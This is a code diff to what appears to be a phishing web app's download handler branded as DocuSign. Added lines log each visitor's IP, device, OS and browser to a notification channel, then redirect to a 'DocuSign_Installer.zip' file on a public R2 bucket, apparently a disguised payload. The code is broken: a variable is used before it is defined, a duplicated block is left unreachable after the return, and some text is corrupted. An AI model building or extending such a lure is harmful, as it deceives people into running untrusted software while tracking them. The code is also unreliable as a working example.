@@ -146,7 +146,46 @@ def download():
     
     # Send download button click notification
     download_message = f"""
-🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐𝘊𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕
+🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐�𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕
+
+🌐 𝘐𝘗 𝘋𝘈𝘛𝘈
+━━━━━━━━━━━━━━━━
+📍 IP: {ip}
+
+💻 𝘋𝘌𝘝𝘐𝘊𝘌
+━━━━━━━━━━━━━━━━
+🖥️ Type: {device_type}
+⚙️ OS: {ua.os.family} {ua.os.version_string}
+🌐 Browser: {ua.browser.family} {ua.browser.version_string}
+
+⏰ 𝘛𝘐𝘔𝘌
+━━━━━━━━━━━━━━━━
+📅 {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+"""
+    
+    send_notification(download_message)
+    
+    # Redirect to R2 URL
+    r2_url = "https://pub-5943043f0aa3454291be9cd2fe736787.r2.dev/DocuSign_Installer.zip"
+    return redirect(r2_url, code=302)
+    
+    # Get IP and device info for notification
+    # Get real IP from proxy headers (Render uses proxy)
+    if request.headers.get('X-Forwarded-For'):
+        ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+    elif request.headers.get('X-Real-IP'):
+        ip = request.headers.get('X-Real-IP')
+    else:
+        ip = request.remote_addr
+    
+    user_agent_string = request.headers.get("User-Agent", "")
+    ua = parse(user_agent_string)
+    
+    device_type = "Mobile 📱" if ua.is_mobile else "Tablet 📱" if ua.is_tablet else "Desktop 🖥️"
+    
+    # Send download button click notification
+    download_message = f"""
+🔘 𝘋𝘖𝘞𝘕𝘓𝘖𝘈𝘋 𝘉𝘜𝘛𝘛𝘖𝘕 𝘊𝘓𝘐�𝘊𝘒𝘌𝘋 - 𝘋𝘖𝘊𝘚𝘐𝘎𝘕
 
 🌐 𝘐𝘗 𝘋𝘈𝘛𝘈
 ━━━━━━━━━━━━━━━━
